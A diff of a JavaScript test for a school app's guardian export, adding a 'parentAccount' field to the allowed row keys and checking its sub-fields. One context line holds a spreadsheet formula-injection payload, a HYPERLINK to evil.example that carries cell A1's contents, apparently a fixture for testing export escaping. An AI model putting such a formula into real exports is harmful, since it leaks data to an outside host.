@@ -63,7 +63,8 @@ async function addGuardian(student, { name, email = null, phone = null, relation
 
 const EVIL = '=HYPERLINK("http://evil.example/?x="&A1,"click")';
 // addedByStudent: 20261122000001 (false here: these rows are written as postgres, so nobody is recorded as adding them).
-const ALLOWED_KEYS = ["addedByStudent", "classYear", "email", "id", "name", "phone", "receivesAlerts", "receivesReports", "relationship", "studentId", "studentName"];
+// parentAccount: 20261123000002 (the row's Invite to Meridies state; absent on a database without it).
+const ALLOWED_KEYS = ["addedByStudent", "classYear", "email", "id", "name", "parentAccount", "phone", "receivesAlerts", "receivesReports", "relationship", "studentId", "studentName"];
 
 // ---- people ------------------------------------------------------------------------
 const a = await user("gr-a");
@@ -116,7 +117,8 @@ check("a shared student's parent is left out (no student to name) and counted", 
 const annRow = rows.find((r) => r.id === ann);
 check(
   "a row is exactly the listed fields",
-  annRow && JSON.stringify(Object.keys(annRow).sort()) === JSON.stringify(ALLOWED_KEYS) &&
+  annRow && JSON.stringify(Object.keys(annRow).sort()) === JSON.stringify(ALLOWED_KEYS.filter((k) => k !== "parentAccount" || "parentAccount" in annRow)) &&
+    (!("parentAccount" in annRow) || JSON.stringify(Object.keys(annRow.parentAccount).sort()) === JSON.stringify(["delivery", "expiresAt", "invitedAt", "state"])) &&
     annRow.name === "Ann Lee" && annRow.relationship === "mother" && annRow.email === `ann-${tag}@example.com` && annRow.phone === "+1 555 010 0001" &&
     annRow.studentId === s1.id && annRow.studentName === "Maya Lee" && annRow.classYear === "2027" && annRow.receivesAlerts === true && annRow.receivesReports === true,
   JSON.stringify(annRow)
